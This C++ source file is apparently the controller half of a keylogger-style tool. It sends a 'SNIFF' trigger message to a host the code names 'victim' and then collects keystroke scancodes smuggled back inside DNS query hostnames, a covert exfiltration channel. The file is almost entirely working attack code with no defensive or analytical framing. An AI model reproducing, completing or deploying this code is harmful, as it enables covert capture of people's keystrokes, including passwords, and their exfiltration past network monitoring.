#include "common.h"
#include "ip.hpp"
#include "dns.hpp"

static void RunServer();
static void RunClient();
static void StartSniffing();
static void Start(std::string const &server_ip, int server_port,
                  std::string const &victim_ip);
static std::string CreateStartSniffingMessage(std::string const &server_ip, int server_port);


#define KEYWORD_RUN_SNIFFING "SNIFF"
#define DEFAULT_SERVER_PORT 13131

struct Arguments
{
    std::string server_ip;
    int server_port;
    std::string victim_ip;

    static bool Parse(int argc, char *argv[], Arguments &arguments)
    {
        Strings args;
        for (int i = 0; i < argc; ++i) {
            args.push_back(argv[i]);
        }

        return Parse(args, arguments);
    }

    static bool Parse(Strings const &args, Arguments &arguments)
    {
        if (args.size() < 6) {
            return false;
        }

        if (args[1] != "--server") {
            return false;
        }

        arguments.server_ip = args[2];
        arguments.server_port = atoi(args[3].c_str());

        if (args[4] != "--victim") {
            return false;
        }

        arguments.victim_ip = args[5];

        return true;
    }
};

int main(int argc, char *argv[])
{
    Arguments arguments;

    if (!Arguments::Parse(argc, argv, arguments)) {
        std::cout << "Incorrect arguments!" << std::endl;
        return -1;
    }

    Start(arguments.server_ip, arguments.server_port, arguments.victim_ip);
}

static void RunClient()
{
    DnsQuerySender sender("192.168.30.201", DEFAULT_SERVER_PORT);
    DnsNameResolver resolver("8.8.8.8", 53);

    while (true) {
        std::string hostname;
        std::getline(std::cin, hostname);

        sender.SendQuery(DnsQuery(hostname));
        std::cout << "Sended" << std::endl;

        DnsAnswer answer = resolver.Resolve(hostname);
        std::cout << answer.ToString() << std::endl;
    }
}

static void RunServer()
{
    DnsQueryReceiver receiver("localhost", DEFAULT_SERVER_PORT);

    while(true) {
        DnsQuery query = receiver.ReceiveQuery();
        std::cout << "Received" << std::endl;
        std::cout << query.HostName() << std::endl;
    }
}

static void Start(std::string const &server_ip, int server_port, std::string const &victim_ip)
{
    UdpSender sender(victim_ip, 10000);
    DnsQueryReceiver server(server_ip, server_port);

    std::string msg = CreateStartSniffingMessage(server_ip, server_port);
    sender.Send(msg);

    int scancode;
    while (true) {
        DnsQuery query = server.ReceiveQuery();
        sscanf(query.HostName().c_str(), "%d", &scancode);

        std::cout << "Received: " << query.HostName() << std::endl;
        std::cout << "Scancode: " << scancode << std::endl;
        std::cout << std::endl;
    }
}

static std::string CreateStartSniffingMessage(std::string const &serverIp, int serverPort)
{
    char buf[32];
    size_t pos;
    struct in_addr addr;
    unsigned short port;

    if (inet_aton(serverIp.c_str(), &addr) == 0) {
        throw NetException("Fail to create start-sniffing message");
    }
    port = htons((uint16_t)serverPort);

    pos = 0;

    memcpy(buf + pos, KEYWORD_RUN_SNIFFING, strlen(KEYWORD_RUN_SNIFFING));
    pos += strlen(KEYWORD_RUN_SNIFFING);

    buf[pos] = ':';
    ++pos;

    memcpy(buf + pos, (char *)&addr.s_addr, sizeof(addr.s_addr));
    pos += sizeof(addr.s_addr);

    buf[pos] = ':';
    ++pos;

    memcpy(buf + pos, (char *)&port, sizeof(port));
    pos += sizeof(port);

    buf[pos] = '\0';

    return std::string(buf);
}
